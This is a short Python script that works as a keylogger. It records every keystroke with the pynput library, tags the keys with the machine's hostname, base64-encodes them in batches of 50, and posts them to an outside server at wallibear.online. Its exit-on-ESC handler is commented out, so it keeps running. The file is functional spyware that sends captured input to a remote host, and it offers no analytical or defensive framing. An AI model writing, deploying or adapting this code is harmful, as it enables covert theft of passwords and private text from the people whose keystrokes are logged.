from pynput import keyboard
import subprocess
import requests
import base64

host = subprocess.run(
    ["hostname"],
    capture_output=True,
    text=True
)

key_strokes = []

threshold = 50

count = 0

target_host = host.stdout

print("Keyboard monitor started. Press ESC to exit.\n")

def on_press(key):
    global count
    try:
        print(f"Pressed: {key.char}")
        key_strokes.append(key.char)
        count += 1
    except AttributeError:
        print(f"Pressed: {key}")
        key_strokes.append(key)
        count += 1
    
    if count == threshold:
        send_logs()
        reset()

def send_logs():
    for cipher in key_strokes:
        push(target_host, cipher)

def reset():
    global key_strokes, count
    count = 0
    key_strokes.clear()

def on_release(key):
    ...
    # if key == keyboard.Key.esc:
    #     print("\nExiting...")
    #     return False


def push(host, text, endpoint="https://wallibear.online/radium/manage.php"):
    if not isinstance(text, str):
        text = str(text)
    ciphertext = base64.b64encode(text.encode()).decode()
    data = {
        "host": host,
        "ciphertext": ciphertext,
        "action": "1",  # hidden field in the form
    }
    return requests.post(endpoint, data=data)

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release
) as listener:
    listener.join()